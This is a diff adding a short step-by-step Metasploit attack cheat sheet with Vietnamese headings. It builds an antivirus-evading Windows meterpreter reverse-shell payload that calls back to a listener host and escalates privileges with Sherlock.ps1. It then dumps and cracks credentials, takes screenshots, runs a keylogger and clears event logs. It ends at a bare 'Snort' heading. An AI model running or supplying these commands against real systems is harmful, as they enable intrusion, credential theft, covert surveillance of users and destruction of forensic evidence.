@@ -1,0 +1,33 @@
+1.	Tạo tệp độc hại
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.8.103 LPORT=4444 -o /root/something32.exe
+python3 phantom-evasion.py 
+msfdb init; msfconsole -q  -x  "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.8.103; run"
+2.	Thực thi
+getuid
+sysinfo
+3.	Leo thang đặc quyền
+load powershell
+( trinh sát)
+powershell_import 'Sherlock.ps1'
+powershell_execute "Find-allvulns"
+powershell_import 'exploit.ps1'
+4.	Lấy thông tin
+creds -d -S
+use auxiliary/analyze/crack_windows
+5.	Chụp màn hình
+screenshot -p /root/Desktop/picture/hinh1.jpg
+load espia
+screengrab /root/Desktop/hinh1.jpg
+6.	Keylogger
+Ps
+ps -S explorer.exe
+migrate <PID>
+keyscan_start -v
+keyscan_dump
+keyscan_stop
+run post/windows/capture/keylog_recorder
+7.	Xoá dấu vết
+Sysinfo
+Clearev 
+Run event_manager -c
+8.	Snort
